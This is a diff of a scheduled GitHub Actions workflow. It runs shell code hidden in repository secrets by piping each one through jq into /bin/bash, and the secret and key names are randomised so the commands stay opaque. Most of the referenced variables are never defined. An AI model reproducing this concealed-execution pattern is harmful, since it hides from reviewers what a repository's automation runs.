@@ -1,29 +1,24 @@
 name: niulangqn
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 5/6 * * *'
+    - cron: '8 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: niulangqn
         env:
-          gbz8290: ${{ secrets.gbz8290 }}
+          a3176: ${{ secrets.a3176 }}
         run: |
-          echo $gbz8290 | jq -r .zqe13 | /bin/bash
-          echo $qxmjp33462 | jq -r .rfupm627 | /bin/bash
-          echo $f5466 | jq -r .ywiu0 | /bin/bash
-          echo $ru321 | jq -r .wfr52 | /bin/bash
-          echo $mazy81359 | jq -r .lul0505 | /bin/bash
-          echo $aqf99 | jq -r .hr8 | /bin/bash
-          echo $qmdej8604 | jq -r .qpa123 | /bin/bash
-          echo $esc94 | jq -r .ul16198 | /bin/bash
-          echo $irrw0 | jq -r .epo51 | /bin/bash
-          echo $gnzk61396 | jq -r .rysv55258 | /bin/bash
-          echo $ubdmx1869 | jq -r .t92 | /bin/bash
-          echo $lfov21224 | jq -r .y6 | /bin/bash
-          echo $ooxd30970 | jq -r .jlg369 | /bin/bash
+          echo $a3176 | jq -r .bt0 | /bin/bash
+          echo $trss4 | jq -r .colc57558 | /bin/bash
+          echo $yh501 | jq -r .qne10886 | /bin/bash
+          echo $jzcu4 | jq -r .wc4683 | /bin/bash
+          echo $pv8612 | jq -r .hdyc004 | /bin/bash
+          echo $kcaa21401 | jq -r .rtqt649 | /bin/bash
+          echo $btew3 | jq -r .h4304 | /bin/bash
 
